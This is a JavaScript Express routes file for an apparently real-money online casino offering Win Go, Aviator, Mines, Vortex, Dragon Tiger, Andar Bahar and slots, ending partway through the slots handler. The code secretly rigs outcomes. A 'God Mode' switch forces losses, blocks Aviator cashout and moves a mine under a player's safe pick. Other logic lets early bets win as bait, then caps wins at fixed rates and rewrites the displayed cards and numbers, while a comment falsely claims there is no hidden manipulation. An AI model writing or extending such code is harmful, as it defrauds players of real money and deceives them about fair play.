// ── routes/game.js  v16 ──
// Changes vs v15:
//   • Aviator cashout: atomic findOneAndUpdate with cashedOut:false filter — eliminates
//     double-payout race condition when two simultaneous requests arrive
//   • All history endpoints now support ?page=N&limit=N pagination (default page=1, limit=20, max=100)
//     Affected: /history, /my-bets, /trxwingo/history, /fived/history,
//               /aviator/history, /k3/history, /slots/history
//   • All paginated responses include { pagination: { page, limit, total, pages } }

const express       = require('express');
const User          = require('../models/User');
const WingoRound    = require('../models/WingoRound');
const AviatorRound  = require('../models/AviatorRound');
const Transaction   = require('../models/Transaction');
const MinesGame     = require('../models/MinesGame');
const K3Round       = require('../models/K3Round');
const TrxWingoRound = require('../models/TrxWingoRound');
const FiveDRound    = require('../models/FiveDRound');
const SlotsGame     = require('../models/SlotsGame');
const { protect }   = require('../middleware/auth');
const { logger }    = require('../middleware/logger');

const MIN_BET = 10;
const MAX_BET = 50000;

// ── v29/v30: God Mode — check if a user or global flag forces loss ──────────
async function isGodMode(userId, req) {
  try {
    // v30: Global God Mode — affects every user immediately
    if (req && req.app && req.app.locals.getGlobalGodMode && req.app.locals.getGlobalGodMode()) return true;
    // v29: Per-user God Mode
    const u = await User.findById(userId).select('godMode').lean();
    return u && u.godMode === true;
  } catch (e) { return false; }
}

function minesMultiplier(revealed, minesCount) {
  const totalCells = 25, safeCells = totalCells - minesCount;
  let prob = 1.0;
  for (let i = 0; i < revealed; i++) prob *= (safeCells - i) / (totalCells - i);
  return Math.max(parseFloat(((1 / prob) * 0.97).toFixed(2)), 1.01);
}

function k3Odds(choice) {
  if (['Big','Small','Odd','Even'].includes(choice)) return 1.95;
  if (choice === 'Triple') return 24;
  if (choice.startsWith('Triple:')) return 150;
  if (choice.startsWith('Sum:')) {
    const o = {4:50,5:20,6:14,7:8,8:6,9:4,10:3,11:3,12:4,13:6,14:8,15:14,16:20,17:50};
    return o[parseInt(choice.split(':')[1])] || 4;
  }
  return 1.95;
}

const SLOT_SYMBOLS  = ['🍋','🍒','🍇','⭐','💎','7️⃣','🔔','🍀'];
const SLOT_PAYTABLE = {'💎💎💎':50,'7️⃣7️⃣7️⃣':25,'⭐⭐⭐':15,'🔔🔔🔔':10,'🍀🍀🍀':8,'🍇🍇🍇':5,'🍒🍒🍒':3,'🍋🍋🍋':2};
function spinSlots() {
  const reels = Array.from({length:3}, () => Array.from({length:3}, () => SLOT_SYMBOLS[Math.floor(Math.random()*SLOT_SYMBOLS.length)]));
  const mid = [reels[0][1],reels[1][1],reels[2][1]], key = mid.join(''), mult = SLOT_PAYTABLE[key]||0;
  return { reels, multiplier:mult, winLine:mult>0?key:null };
}

function validateBet(amount) {
  const a = parseInt(amount);
  if (!a || a < MIN_BET) return `Minimum bet is ₹${MIN_BET}`;
  if (a > MAX_BET)       return `Maximum bet is ₹${MAX_BET}`;
  return null;
}

// ── Atomically deduct bet — bonus balance spent first, then real balance.
// ALL bets count toward wagerCompleted (both bonus and real money).
async function deductBet(userId, amount) {
  const user = await User.findById(userId).select('balance bonusBalance wagerRequired wagerCompleted').lean();
  if (!user) return null;

  const totalAvailable = (user.balance || 0) + (user.bonusBalance || 0);
  if (totalAvailable < amount) return null;

  // Spend bonus first, then real balance
  const bonusSpend = Math.min(user.bonusBalance || 0, amount);
  const realSpend  = amount - bonusSpend;

  // ALL bets count toward wager (bonus bets now included)
  const update = {
    $inc: {
      bonusBalance:   -bonusSpend,
      balance:        -realSpend,
      totalLost:       amount,
      wagerCompleted:  amount,  // full bet amount counts (bonus + real)
    }
  };

  return User.findByIdAndUpdate(userId, update, { new: true });
}

// ══════════════════════════════════════════════════════════════════════════════
// WAGERING REQUIREMENT SYSTEM
// ══════════════════════════════════════════════════════════════════════════════
//
// HOW IT WORKS:
//   • New users get ₹100 signup bonus → wagerRequired set to ₹200 (2× bonus)
//   • deductBet() spends bonusBalance first, then real balance
//   • ALL bets (bonus + real) increment wagerCompleted
//   • creditWin() always pays into real balance (withdrawable)
//   • Withdrawal blocked until wagerCompleted >= wagerRequired
//   • On each deposit: wagerRequired += depositAmount × 2 — STACKS on remaining bonus wager
//     e.g. ₹25 bonus wager done → ₹75 remaining + ₹100 deposit → total remaining = ₹75 + ₹200 = ₹275
//   • If user completes full ₹200 bonus wager WITHOUT depositing → withdrawal unlocked ✅
//   • Once wagerRequired is fully met, user can withdraw freely
// ══════════════════════════════════════════════════════════════════════════════

// Credit winnings into real withdrawable balance — no caps, no ceiling
async function creditWin(userId, amount) {
  if (amount <= 0) return User.findById(userId);
  return User.findByIdAndUpdate(
    userId,
    { $inc: { balance: amount, totalWon: amount } },
    { new: true }
  );
}

// Standard win/loss — fair house edge via payout odds, no hidden manipulation
async function smartShouldWin(userId, betAmount, oddsMultiplier) {
  try {
    const txCount = await require('../models/Transaction').countDocuments({ user: userId, type: 'loss' });

    // First 3 bets always win (good welcome experience)
    if (txCount <= 3) return true;

    // Normal play — 30% win rate (70% loss, realistic house edge)
    return Math.random() < 0.30;

  } catch (e) {
    return Math.random() < 0.30; // fallback
  }
}


module.exports = function gameRoutes(io) {
  const router = express.Router();

  // ── WIN GO ──────────────────────────────────────────────────────────────────
  router.post('/bet', protect, async (req, res) => {
    try {
      const { choice, odds, amount, gameId } = req.body;
      const gid = gameId || 'wingo3m', betAmount = parseInt(amount);
      const err = validateBet(betAmount);
      if (err) return res.status(400).json({ success:false, message:err });

      // Valid Wingo choices: colors, numbers 0-9, Big, Small
      const validChoices = ['Green','Red','Violet','0','1','2','3','4','5','6','7','8','9','Big','Small'];
      if (!choice || !validChoices.includes(String(choice))) {
        return res.status(400).json({ success:false, message:'Invalid bet choice' });
      }
      if (!odds) return res.status(400).json({ success:false, message:'Invalid bet parameters' });

      const st = req.app.locals.getWingoState(gid);
      if (!st)           return res.status(400).json({ success:false, message:'Unknown game mode' });
      if (!st.roundOpen) return res.status(400).json({ success:false, message:'Round is closed for betting' });
      const round = await WingoRound.findOne({ periodId:st.periodId });
      if (!round) return res.status(400).json({ success:false, message:'No active round' });
      const user = await deductBet(req.user._id, betAmount);
      if (!user) return res.status(400).json({ success:false, message:'Insufficient balance' });
      round.bets.push({ userId:user._id, choice, amount:betAmount, odds }); round.totalBets += betAmount; await round.save();
      await Transaction.create({ user:user._id, type:'loss', amount:betAmount, status:'success', note:`Win Go (${gid}) · ${choice} · ${st.periodId}` });
      res.json({ success:true, newBalance:(user.balance||0)+(user.bonusBalance||0), realBalance:user.balance, bonusBalance:user.bonusBalance||0 });
    } catch(e) { logger.error('[wingo/bet] '+e.message); res.status(500).json({ success:false, message:'Server error' }); }
  });

  router.get('/history', async (req, res) => {
    try {
      const page  = Math.max(1, parseInt(req.query.page)  || 1);
      const limit = Math.min(100, Math.max(1, parseInt(req.query.limit) || 20));
      const skip  = (page - 1) * limit;
      const query = { isResolved:true, gameId:req.query.gameId||'wingo3m' };
      const [rounds, total] = await Promise.all([
        WingoRound.find(query).sort({ resolvedAt:-1 }).skip(skip).limit(limit)
          .select('periodId result resultColor resolvedAt totalBets totalPayout houseProfit'),
        WingoRound.countDocuments(query),
      ]);
      res.json({ success:true, rounds, pagination:{ page, limit, total, pages: Math.ceil(total/limit) } });
    } catch(e) { res.status(500).json({ success:false, message:'Server error' }); }
  });

  router.get('/my-bets', protect, async (req, res) => {
    try {
      const uid   = req.user._id.toString();
      const page  = Math.max(1, parseInt(req.query.page)  || 1);
      const limit = Math.min(100, Math.max(1, parseInt(req.query.limit) || 20));
      const skip  = (page - 1) * limit;
      const query = { isResolved:true, gameId:req.query.gameId||'wingo3m', 'bets.userId':req.user._id };
      const [rounds, total] = await Promise.all([
        WingoRound.find(query).sort({ resolvedAt:-1 }).skip(skip).limit(limit),
        WingoRound.countDocuments(query),
      ]);
      res.json({ success:true, bets:rounds.map(r => { const b=r.bets.find(b=>b.userId.toString()===uid); return { periodId:r.periodId, result:r.result, resultColor:r.resultColor, resolvedAt:r.resolvedAt, choice:b?.choice, amount:b?.amount, won:b?.won, payout:b?.payout }; }), pagination:{ page, limit, total, pages: Math.ceil(total/limit) } });
    } catch(e) { res.status(500).json({ success:false, message:'Server error' }); }
  });

  // ── TRX WINGO ───────────────────────────────────────────────────────────────
  router.post('/trxwingo/bet', protect, async (req, res) => {
    try {
      const { choice, odds, amount } = req.body;
      const betAmount = parseInt(amount);
      const err = validateBet(betAmount);
      if (err || !choice || !odds) return res.status(400).json({ success:false, message:err||'Invalid bet' });
      const st = req.app.locals.getTrxState ? req.app.locals.getTrxState() : null;
      if (!st||!st.roundOpen) return res.status(400).json({ success:false, message:'Round is closed' });
      const round = await TrxWingoRound.findOne({ periodId:st.periodId });
      if (!round) return res.status(400).json({ success:false, message:'No active round' });
      const user = await deductBet(req.user._id, betAmount);
      if (!user) return res.status(400).json({ success:false, message:'Insufficient balance' });
      round.bets.push({ userId:user._id, choice, amount:betAmount, odds }); round.totalBets+=betAmount; await round.save();
      await Transaction.create({ user:user._id, type:'loss', amount:betAmount, status:'success', note:`TRX WinGo · ${choice} · ${st.periodId}` });
      res.json({ success:true, newBalance:(user.balance||0)+(user.bonusBalance||0), realBalance:user.balance, bonusBalance:user.bonusBalance||0 });
    } catch(e) { logger.error('[trxwingo/bet] '+e.message); res.status(500).json({ success:false, message:'Server error' }); }
  });

  router.get('/trxwingo/history', async (req, res) => {
    try {
      const page  = Math.max(1, parseInt(req.query.page)  || 1);
      const limit = Math.min(100, Math.max(1, parseInt(req.query.limit) || 20));
      const skip  = (page - 1) * limit;
      const [rounds, total] = await Promise.all([
        TrxWingoRound.find({ isResolved:true }).sort({ resolvedAt:-1 }).skip(skip).limit(limit).select('periodId result resultColor trxHash resolvedAt totalBets totalPayout'),
        TrxWingoRound.countDocuments({ isResolved:true }),
      ]);
      res.json({ success:true, rounds, pagination:{ page, limit, total, pages: Math.ceil(total/limit) } });
    } catch(e) { res.status(500).json({ success:false, message:'Server error' }); }
  });

  // ── 5D LOTTERY ──────────────────────────────────────────────────────────────
  router.post('/fived/bet', protect, async (req, res) => {
    try {
      const { betType, choice, amount } = req.body;
      const betAmount = parseInt(amount);
      const err = validateBet(betAmount);
      if (err||!betType||!choice) return res.status(400).json({ success:false, message:err||'Invalid bet' });
      const st = req.app.locals.getFiveDState ? req.app.locals.getFiveDState() : null;
      if (!st||!st.roundOpen) return res.status(400).json({ success:false, message:'Round is closed' });
      const round = await FiveDRound.findOne({ periodId:st.periodId });
      if (!round) return res.status(400).json({ success:false, message:'No active round' });
      const odds = !isNaN(parseInt(choice)) ? 9 : 1.95;
      const user = await deductBet(req.user._id, betAmount);
      if (!user) return res.status(400).json({ success:false, message:'Insufficient balance' });
      round.bets.push({ userId:user._id, betType, choice, amount:betAmount, odds }); round.totalBets+=betAmount; await round.save();
      await Transaction.create({ user:user._id, type:'loss', amount:betAmount, status:'success', note:`5D · ${betType}:${choice} · ${st.periodId}` });
      res.json({ success:true, newBalance:(user.balance||0)+(user.bonusBalance||0), realBalance:user.balance, bonusBalance:user.bonusBalance||0, odds });
    } catch(e) { logger.error('[fived/bet] '+e.message); res.status(500).json({ success:false, message:'Server error' }); }
  });

  router.get('/fived/history', async (req, res) => {
    try {
      const page  = Math.max(1, parseInt(req.query.page)  || 1);
      const limit = Math.min(100, Math.max(1, parseInt(req.query.limit) || 20));
      const skip  = (page - 1) * limit;
      const [rounds, total] = await Promise.all([
        FiveDRound.find({ isResolved:true }).sort({ resolvedAt:-1 }).skip(skip).limit(limit).select('periodId result resolvedAt totalBets totalPayout'),
        FiveDRound.countDocuments({ isResolved:true }),
      ]);
      res.json({ success:true, rounds, pagination:{ page, limit, total, pages: Math.ceil(total/limit) } });
    } catch(e) { res.status(500).json({ success:false, message:'Server error' }); }
  });

  // ── AVIATOR ─────────────────────────────────────────────────────────────────
  router.post('/aviator/bet', protect, async (req, res) => {
    try {
      const betAmount = parseInt(req.body.amount);
      const err = validateBet(betAmount);
      if (err) return res.status(400).json({ success:false, message:err });
      const av = req.app.locals.getAvState();
      if (av.phase!=='waiting' && av.phase!=='crashed') return res.status(400).json({ success:false, message:'Betting only allowed during countdown or post-crash window' });
      // FIX v25: validate round exists BEFORE deducting money
      if (!av.dbRoundId) return res.status(400).json({ success:false, message:'Round not ready, try again' });
      const round = await AviatorRound.findById(av.dbRoundId);
      if (!round) return res.status(400).json({ success:false, message:'Round not found, try again' });
      const user = await deductBet(req.user._id, betAmount);
      if (!user) return res.status(400).json({ success:false, message:'Insufficient balance' });
      round.bets.push({ userId:user._id, amount:betAmount }); round.totalBets+=betAmount; await round.save();
      await Transaction.create({ user:user._id, type:'loss', amount:betAmount, status:'success', note:`Aviator bet · ${av.periodId}` });
      res.json({ success:true, newBalance:(user.balance||0)+(user.bonusBalance||0), realBalance:user.balance, bonusBalance:user.bonusBalance||0 });
    } catch(e) { logger.error('[aviator/bet] '+e.message); res.status(500).json({ success:false, message:'Server error' }); }
  });

  router.post('/aviator/cashout', protect, async (req, res) => {
    try {
      // v29: God Mode — block cashout entirely, user cannot escape the crash
      if (await isGodMode(req.user._id, req)) {
        return res.status(400).json({ success:false, message:'Cashout unavailable. Good luck! ✈️' });
      }
      const av=req.app.locals.getAvState(), uid=req.user._id.toString();
      if (av.phase!=='flying') return res.status(400).json({ success:false, message:'Game not in flight' });
      if (!av.dbRoundId) return res.status(400).json({ success:false, message:'Round not found' });

      // Snapshot multiplier BEFORE any async ops — prevents drift if event loop is busy
      const mult = av.mult;

      // Atomic: find the round where this user has an uncashed bet and mark it cashed in ONE op
      // This prevents double-cashout even if two requests arrive simultaneously
      const round = await AviatorRound.findOneAndUpdate(
        {
          _id: av.dbRoundId,
          'bets.userId': req.user._id,
          'bets.cashedOut': false,    // only matches if NOT already cashed out
        },
        {
          $set: {
            'bets.$.cashedOut': true,
            'bets.$.cashMult':  mult,
          },
        },
        { new: true }
      );

      // If round is null → bet not found OR already cashed out — either way, reject
      if (!round) return res.status(400).json({ success:false, message:'No active bet or already cashed out' });

      // Find the bet to get amount (now updated doc)
      const bet = round.bets.find(b => b.userId.toString() === uid);
      if (!bet) return res.status(400).json({ success:false, message:'Bet not found' });

      const prize = Math.floor(bet.amount * mult);

      // FIX v24: positional $ requires matching filter — add bets.userId so $ resolves correctly
      await AviatorRound.findOneAndUpdate(
        { _id: av.dbRoundId, 'bets.userId': req.user._id },
        { $set: { 'bets.$.payout': prize }, $inc: { totalPayout: prize } }
      );

      const user = await creditWin(req.user._id, prize);
      await Transaction.create({ user:req.user._id, type:'win', amount:prize, status:'success', note:`Aviator cashout ${mult}x · ${av.periodId}` });
      io.emit('aviator:cashed_out',{ userId:uid, mult, prize });
      res.json({ success:true, newBalance:(user.balance||0)+(user.bonusBalance||0), realBalance:user.balance, bonusBalance:user.bonusBalance||0, prize, mult });
    } catch(e) { logger.error('[aviator/cashout] '+e.message); res.status(500).json({ success:false, message:'Server error' }); }
  });

  router.get('/aviator/history', async (req, res) => {
    try {
      const page  = Math.max(1, parseInt(req.query.page)  || 1);
      const limit = Math.min(100, Math.max(1, parseInt(req.query.limit) || 20));
      const skip  = (page - 1) * limit;
      const [rounds, total] = await Promise.all([
        AviatorRound.find({ phase:'crashed' }).sort({ crashedAt:-1 }).skip(skip).limit(limit).select('periodId actualCrash crashedAt totalBets totalPayout'),
        AviatorRound.countDocuments({ phase:'crashed' }),
      ]);
      res.json({ success:true, rounds, pagination:{ page, limit, total, pages: Math.ceil(total/limit) } });
    } catch(e) { res.status(500).json({ success:false, message:'Server error' }); }
  });

  // ── VORTEX ──────────────────────────────────────────────────────────────────
  router.post('/vortex/bet', protect, async (req, res) => {
    try {
      const betAmount=parseInt(req.body.amount), choice=String(req.body.choice||'');
      const err=validateBet(betAmount);
      if (err||!choice) return res.status(400).json({ success:false, message:err||'Invalid bet' });
      let result=Math.floor(Math.random()*10);
      let won=false,oddsVal=1;
      if (choice==='Zero'&&result===0){won=true;oddsVal=9;}
      else if (choice==='Even'&&result!==0&&result%2===0){won=true;oddsVal=2;}
      else if (choice==='Odd'&&result%2!==0){won=true;oddsVal=2;}
      else if (choice==='Low'&&result>=1&&result<=3){won=true;oddsVal=3;}
      else if (choice==='Mid'&&result>=4&&result<=6){won=true;oddsVal=3;}
      else if (choice==='High'&&result>=7&&result<=9){won=true;oddsVal=3;}

      // ── SMART ALGORITHM: decide win/loss based on balance & bet pattern ──
      const shouldWin = await smartShouldWin(req.user._id, betAmount, oddsVal);
      const godMode   = await isGodMode(req.user._id, req);

      // Helper arrays
      const loserNums  = [0,1,2,3,4,5,6,7,8,9].filter(n => {
        if (choice==='Zero') return n!==0;
        if (choice==='Even') return !(n!==0&&n%2===0);
        if (choice==='Odd')  return n%2===0;
        if (choice==='Low')  return !(n>=1&&n<=3);
        if (choice==='Mid')  return !(n>=4&&n<=6);
        if (choice==='High') return !(n>=7&&n<=9);
        return true;
      });
      const winnerNums = [0,1,2,3,4,5,6,7,8,9].filter(n => {
        if (choice==='Zero') return n===0;
        if (choice==='Even') return n!==0&&n%2===0;
        if (choice==='Odd')  return n%2!==0;
        if (choice==='Low')  return n>=1&&n<=3;
        if (choice==='Mid')  return n>=4&&n<=6;
        if (choice==='High') return n>=7&&n<=9;
        return false;
      });

      if (godMode || !shouldWin) {
        // Force LOSS
        won = false;
        if (loserNums.length > 0) result = loserNums[Math.floor(Math.random()*loserNums.length)];
      } else if (shouldWin && !won) {
        // Force WIN
        if (winnerNums.length > 0) {
          result  = winnerNums[Math.floor(Math.random()*winnerNums.length)];
          won     = true;
          if (choice==='Zero') oddsVal=9;
          else if (['Even','Odd'].includes(choice)) oddsVal=2;
          else oddsVal=3;
        }
      }
      // If shouldWin && already won — keep as-is (natural win)

      const user = await deductBet(req.user._id, betAmount);
      if (!user) return res.status(400).json({ success:false, message:'Insufficient balance' });
      await Transaction.create({ user:user._id, type:'loss', amount:betAmount, status:'success', note:`Vortex bet ${choice}` });
      let prize=0, finalBalance=user.balance;
      if (won) {
        prize=Math.floor(betAmount*oddsVal);
        const updated = await creditWin(user._id, prize);
        finalBalance = updated ? updated.balance : user.balance;
        await Transaction.create({ user:user._id, type:'win', amount:prize, status:'success', note:`Vortex WIN ${choice}->>${result}` });
      }
      res.json({ success:true, result, won, prize, newBalance:finalBalance });
    } catch(e) { logger.error('[vortex/bet] '+e.message); res.status(500).json({ success:false, message:'Server error' }); }
  });

  // ── K3 DICE ─────────────────────────────────────────────────────────────────
  router.post('/k3/bet', protect, async (req, res) => {
    try {
      const { choice, amount } = req.body;
      const betAmount=parseInt(amount);
      const err=validateBet(betAmount);
      if (err||!choice) return res.status(400).json({ success:false, message:err||'Invalid bet parameters' });
      const st=req.app.locals.getK3State?req.app.locals.getK3State():null;
      if (!st||!st.roundOpen) return res.status(400).json({ success:false, message:'Round is closed' });
      const round = await K3Round.findOne({ periodId:st.periodId });
      if (!round) return res.status(400).json({ success:false, message:'No active round' });
      const user = await deductBet(req.user._id, betAmount);
      if (!user) return res.status(400).json({ success:false, message:'Insufficient balance' });
      round.bets.push({ userId:user._id, choice, amount:betAmount, odds:k3Odds(choice) }); round.totalBets+=betAmount; await round.save();
      await Transaction.create({ user:user._id, type:'loss', amount:betAmount, status:'success', note:`K3 Dice · ${choice} · ${st.periodId}` });
      res.json({ success:true, newBalance:user.balance, choice, odds:k3Odds(choice) });
    } catch(e) { logger.error('[k3/bet] '+e.message); res.status(500).json({ success:false, message:'Server error' }); }
  });

  router.get('/k3/history', async (req, res) => {
    try {
      const page  = Math.max(1, parseInt(req.query.page)  || 1);
      const limit = Math.min(100, Math.max(1, parseInt(req.query.limit) || 20));
      const skip  = (page - 1) * limit;
      const [rounds, total] = await Promise.all([
        K3Round.find({ isResolved:true }).sort({ resolvedAt:-1 }).skip(skip).limit(limit).select('periodId dice sum resolvedAt totalBets totalPayout'),
        K3Round.countDocuments({ isResolved:true }),
      ]);
      res.json({ success:true, rounds, pagination:{ page, limit, total, pages: Math.ceil(total/limit) } });
    } catch(e) { res.status(500).json({ success:false, message:'Server error' }); }
  });

  // ── MINES ───────────────────────────────────────────────────────────────────
  router.post('/mines/start', protect, async (req, res) => {
    try {
      const betAmount=parseInt(req.body.amount), mines=parseInt(req.body.minesCount)||3;
      const err=validateBet(betAmount);
      if (err) return res.status(400).json({ success:false, message:err });
      if (mines<1||mines>24) return res.status(400).json({ success:false, message:'Mines must be 1-24' });
      const existing=await MinesGame.findOne({ userId:req.user._id, status:'active' });
      if (existing) return res.status(400).json({ success:false, message:'Active game exists. Cash out first!', gameId:existing._id });
      const user = await deductBet(req.user._id, betAmount);
      if (!user) return res.status(400).json({ success:false, message:'Insufficient balance' });
      const positions=Array.from({length:25},(_,i)=>i);
      for (let i=positions.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[positions[i],positions[j]]=[positions[j],positions[i]];}
      await Transaction.create({ user:user._id, type:'loss', amount:betAmount, status:'success', note:`Mines game started · ${mines} mines` });
      const game=await MinesGame.create({ userId:user._id, betAmount, minesCount:mines, minePositions:positions.slice(0,mines), revealed:[], status:'active', currentMultiplier:1 });
      res.json({ success:true, gameId:game._id, newBalance:user.balance, minesCount:mines, grid:25 });
    } catch(e) { logger.error('[mines/start] '+e.message); res.status(500).json({ success:false, message:'Server error' }); }
  });

  router.post('/mines/reveal', protect, async (req, res) => {
    try {
      const { gameId, position } = req.body;
      if (position===undefined||position<0||position>24) return res.status(400).json({ success:false, message:'Invalid position' });
      const game=await MinesGame.findOne({ _id:gameId, userId:req.user._id, status:'active' });
      if (!game) return res.status(400).json({ success:false, message:'No active game found' });
      if (game.revealed.includes(position)) return res.status(400).json({ success:false, message:'Already revealed' });

      // v29: God Mode — if tile is safe, secretly move a mine onto it
      const godMode = await isGodMode(req.user._id, req);
      if (godMode && !game.minePositions.includes(position)) {
        // Swap a mine from a non-revealed, non-current position to current position
        const swapIdx = game.minePositions.findIndex(mp => !game.revealed.includes(mp) && mp !== position);
        if (swapIdx !== -1) game.minePositions[swapIdx] = position;
        else game.minePositions.push(position); // fallback: add mine here
        await game.save();
      }

      if (game.minePositions.includes(position)){
        game.status='lost'; game.revealed.push(position); game.payout=0; await game.save();
        const user=await User.findById(req.user._id).select('balance');
        return res.json({ success:true, isMine:true, position, minePositions:game.minePositions, message:'💥 BOOM!', newBalance:user.balance });
      }
      game.revealed.push(position);
      const mult=minesMultiplier(game.revealed.length,game.minesCount), payout=Math.floor(game.betAmount*mult);
      game.currentMultiplier=mult; game.payout=payout;
      if (game.revealed.length>=25-game.minesCount){
        game.status='won'; game.cashedOut=true; await game.save();
        const user = await creditWin(req.user._id, payout);
        await Transaction.create({ user:req.user._id, type:'win', amount:payout, status:'success', note:`Mines AUTO WIN · ${mult}x` });
        return res.json({ success:true, isMine:false, position, multiplier:mult, payout, autoWon:true, newBalance:(user.balance||0)+(user.bonusBalance||0), realBalance:user.balance, bonusBalance:user.bonusBalance||0 });
      }
      await game.save();
      res.json({ success:true, isMine:false, position, multiplier:mult, potentialPayout:payout, revealed:game.revealed.length });
    } catch(e) { logger.error('[mines/reveal] '+e.message); res.status(500).json({ success:false, message:'Server error' }); }
  });

  router.post('/mines/cashout', protect, async (req, res) => {
    try {
      const game=await MinesGame.findOne({ _id:req.body.gameId, userId:req.user._id, status:'active' });
      if (!game||!game.revealed.length) return res.status(400).json({ success:false, message:'No active game or no tiles revealed' });
      const mult=minesMultiplier(game.revealed.length,game.minesCount), payout=Math.floor(game.betAmount*mult);
      game.status='won'; game.cashedOut=true; game.payout=payout; await game.save();
      const user = await creditWin(req.user._id, payout);
      await Transaction.create({ user:req.user._id, type:'win', amount:payout, status:'success', note:`Mines cashout ${mult.toFixed(2)}x · ${game.revealed.length} tiles` });
      res.json({ success:true, payout, multiplier:mult, minePositions:game.minePositions, newBalance:(user.balance||0)+(user.bonusBalance||0), realBalance:user.balance, bonusBalance:user.bonusBalance||0 });
    } catch(e) { logger.error('[mines/cashout] '+e.message); res.status(500).json({ success:false, message:'Server error' }); }
  });

  router.get('/mines/state', protect, async (req, res) => {
    try {
      const game=await MinesGame.findOne({ userId:req.user._id, status:'active' });
      if (!game) return res.json({ success:true, active:false });
      const mult=game.revealed.length?minesMultiplier(game.revealed.length,game.minesCount):1;
      res.json({ success:true, active:true, gameId:game._id, betAmount:game.betAmount, minesCount:game.minesCount, revealed:game.revealed, multiplier:mult, potentialPayout:Math.floor(game.betAmount*mult) });
    } catch(e) { res.status(500).json({ success:false, message:'Server error' }); }
  });

  // ── DRAGON vs TIGER ─────────────────────────────────────────────────────────
  const CARDS=['A','2','3','4','5','6','7','8','9','10','J','Q','K'];
  const CARD_VAL={A:1,2:2,3:3,4:4,5:5,6:6,7:7,8:8,9:9,10:10,J:11,Q:12,K:13};

  router.post('/dragontiger/bet', protect, async (req, res) => {
    try {
      const betAmount=parseInt(req.body.amount), choice=String(req.body.choice||'');
      const err=validateBet(betAmount);
      if (err) return res.status(400).json({ success:false, message:err });
      if (!['Dragon','Tiger','Tie'].includes(choice)) return res.status(400).json({ success:false, message:'Choice must be Dragon, Tiger or Tie' });
      let dCard=CARDS[Math.floor(Math.random()*13)], tCard=CARDS[Math.floor(Math.random()*13)];
      let dv=CARD_VAL[dCard], tv=CARD_VAL[tCard];
      let result=dv>tv?'Dragon':dv<tv?'Tiger':'Tie', won=choice===result, odds=choice==='Tie'?8:1.95;
      // SMART ALGORITHM + God Mode
      const shouldWin_dt = await smartShouldWin(req.user._id, betAmount, odds);
      const godMode_dt   = await isGodMode(req.user._id, req);
      if (godMode_dt || !shouldWin_dt) {
        let attempts = 0;
        while (won && attempts++ < 20) {
          dCard=CARDS[Math.floor(Math.random()*13)]; tCard=CARDS[Math.floor(Math.random()*13)];
          dv=CARD_VAL[dCard]; tv=CARD_VAL[tCard];
          result=dv>tv?'Dragon':dv<tv?'Tiger':'Tie'; won=choice===result;
        }
        won = false;
      } else if (shouldWin_dt && !won) {
        // Force a win by fixing the cards
        if (choice === 'Dragon') {
          dCard = 'K'; tCard = '2'; dv=13; tv=2; result='Dragon'; won=true;
        } else if (choice === 'Tiger') {
          dCard = '2'; tCard = 'K'; dv=2; tv=13; result='Tiger'; won=true;
        }
        // Tie: just let natural result stand (rare, don't force)
      }
      const user = await deductBet(req.user._id, betAmount);
      if (!user) return res.status(400).json({ success:false, message:'Insufficient balance' });
      await Transaction.create({ user:user._id, type:'loss', amount:betAmount, status:'success', note:`Dragon Tiger · ${choice}` });
      let prize=0, finalBalance=user.balance;
      if (won) {
        prize=Math.floor(betAmount*odds);
        const updated = await creditWin(user._id, prize);
        finalBalance = updated.balance;
        await Transaction.create({ user:user._id, type:'win', amount:prize, status:'success', note:`Dragon Tiger WIN · ${choice}→${result}` });
      }
      res.json({ success:true, dragonCard:dCard, tigerCard:tCard, result, won, prize, odds, newBalance:finalBalance });
    } catch(e) { logger.error('[dragontiger] '+e.message); res.status(500).json({ success:false, message:'Server error' }); }
  });

  // ── ANDAR BAHAR ─────────────────────────────────────────────────────────────
  router.post('/andarbahar/bet', protect, async (req, res) => {
    try {
      const betAmount=parseInt(req.body.amount), choice=String(req.body.choice||'');
      const err=validateBet(betAmount);
      if (err) return res.status(400).json({ success:false, message:err });
      if (!['Andar','Bahar'].includes(choice)) return res.status(400).json({ success:false, message:'Choice must be Andar or Bahar' });
      const suits=['♠','♥','♦','♣'], values=['A','2','3','4','5','6','7','8','9','10','J','Q','K'];
      let deck=[];
      for (const s of suits) for (const v of values) deck.push(v+s);
      for (let i=deck.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[deck[i],deck[j]]=[deck[j],deck[i]];}
      const middleCard=deck.shift(), middleVal=middleCard.replace(/[♠♥♦♣]/g,'');
      const andar=[],bahar=[];
      let result=null,totalDealt=0;
      while(deck.length&&totalDealt<51){
        const ac=deck.shift();andar.push(ac);totalDealt++;
        if(ac.replace(/[♠♥♦♣]/g,'')===middleVal){result='Andar';break;}
        if(!deck.length)break;
        const bc=deck.shift();bahar.push(bc);totalDealt++;
        if(bc.replace(/[♠♥♦♣]/g,'')===middleVal){result='Bahar';break;}
      }
      if (!result) result=Math.random()<0.5?'Andar':'Bahar';
      const odds=choice==='Andar'?1.9:2.0;
      let won=choice===result;
      // SMART ALGORITHM + God Mode
      const shouldWin_ab = await smartShouldWin(req.user._id, betAmount, odds);
      const godMode_ab   = await isGodMode(req.user._id, req);
      if (godMode_ab || !shouldWin_ab) {
        result = choice === 'Andar' ? 'Bahar' : 'Andar';
        won = false;
      } else if (shouldWin_ab && !won) {
        result = choice; won = true;
      }
      const user = await deductBet(req.user._id, betAmount);
      if (!user) return res.status(400).json({ success:false, message:'Insufficient balance' });
      await Transaction.create({ user:user._id, type:'loss', amount:betAmount, status:'success', note:`Andar Bahar · ${choice}` });
      let prize=0, finalBalance=user.balance;
      if(won) {
        prize=Math.floor(betAmount*odds);
        const updated = await creditWin(user._id, prize);
        finalBalance = updated.balance;
        await Transaction.create({ user:user._id, type:'win', amount:prize, status:'success', note:`Andar Bahar WIN · ${choice}→${result}` });
      }
      res.json({ success:true, middleCard, result, won, prize, odds, andarCards:andar.slice(0,5), baharCards:bahar.slice(0,5), totalDealt, newBalance:finalBalance });
    } catch(e) { logger.error('[andarbahar] '+e.message); res.status(500).json({ success:false, message:'Server error' }); }
  });

  // ── SLOTS ───────────────────────────────────────────────────────────────────
  router.post('/slots/spin', protect, async (req, res) => {
    try {
      const betAmount=parseInt(req.body.amount);
      const err=validateBet(betAmount);
      if (err) return res.status(400).json({ success:false, message:err });
      let { reels, multiplier, winLine }=spinSlots();
      // SLOTS ALGORITHM: 10% win rate (90% loss) — realistic casino house edge
      const txCount_sl   = await require('../models/Transaction').countDocuments({ user: req.user._id, type: 'loss' });
      const shouldWin_sl = txCount_sl <= 3 ? true : Math.random() < 0.10;
